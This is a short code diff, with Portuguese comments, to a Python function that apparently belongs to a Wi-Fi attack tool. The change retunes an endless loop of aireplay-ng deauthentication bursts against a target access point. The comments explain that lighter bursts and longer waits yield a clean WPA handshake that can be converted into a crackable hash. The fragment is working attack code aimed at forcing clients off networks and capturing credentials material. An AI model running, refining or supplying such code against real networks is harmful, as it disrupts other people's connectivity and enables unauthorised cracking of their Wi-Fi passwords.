@@ -369,11 +369,13 @@ def capture_start(bssids, channels, iface=None, mode="ativo", essid=None):
     )
     deauth_proc = None
     if mode == "ativo":
-        # rajadas de deauth intercaladas: derruba, pausa 6s pra reconectar e soltar o handshake
+        # rajada LEVE de deauth e espera longa: derruba poucos clientes e deixa
+        # ~18s pra reconectarem e o handshake M1-M2 completar LIMPO. Deauth demais
+        # faz o AP renovar o ANONCE e estraga o par EAPOL (nao converte pra hash).
         deauth_proc = subprocess.Popen(
             ["bash", "-c",
-             f"while true; do aireplay-ng --deauth 4 -a {bssid} {iface} "
-             f">/dev/null 2>&1; sleep 6; done"],
+             f"sleep 3; while true; do aireplay-ng --deauth 2 -a {bssid} {iface} "
+             f">/dev/null 2>&1; sleep 18; done"],
             preexec_fn=os.setsid,
         )
     _capture.update({"proc": airo, "deauth": deauth_proc, "started": time.time(),
